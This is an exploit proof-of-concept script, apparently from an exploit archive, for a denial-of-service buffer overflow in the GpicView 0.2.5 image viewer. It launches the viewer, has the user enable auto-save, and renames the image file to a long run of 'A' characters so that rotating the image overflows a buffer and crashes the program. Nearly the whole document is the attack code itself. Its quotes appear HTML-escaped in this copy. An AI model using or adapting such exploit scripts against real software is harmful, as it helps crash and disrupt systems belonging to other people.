# Exploit Title: GpicView Buffer Overflow DOS
# Date: 25th February 2016
# Exploit Author: David Silveiro (Xino.co.uk)
# Vendor Homepage: lxde.sourceforge.net/gpicview/
# Software Link: https://sourceforge.net/projects/lxde/files/GPicView%20%28image%20Viewer%29/0.2.x/
# Version: 0.2.5
# Tested on: Ubuntu 14 LTS
# CVE : 0 day
 
#Example: python POC.py [image-file]
 
from sys        import argv
from subprocess import Popen
from shlex      import split
from time       import sleep
import shutil
 
def DOS(arg):
                                          #"""------------------------------------"""#
    command    = &#039;gpicview &#039; + arg[1]     #&#039;&#039;&#039;   Recieve file & construct Popen   &#039;&#039;&#039;#
    command_2  = split(command)           #"""------------------------------------"""#
                                          #"|"                                    "|"#
    Popen(command_2)                      #"""      Open file with Gpicview       """#
                                          #"""------------------------------------"""#
    print("Required: You have 15 seconds")
    print("check &#039;Auto Save Images&#039;     ")         
    
    sleep(15) 
                                          #"""------------------------------------"""#
    buffer = &#039;A&#039; * 70 + &#039;.png&#039;            #"|"      Rename image with Buffer      "|"#
    shutil.move(arg[1], buffer)           #"""------------------------------------"""#
 
def main():
 
    print("Author:   David Silveiro   ")
    print("Company:  Xino.co.uk       ")
    print("   POC Gpicview DOS        ")
 
    DOS(argv)
 
    print("File ready for overflow    ")
    print("Now simply rotate the image")
 
 
if __name__ == "__main__":
   main()

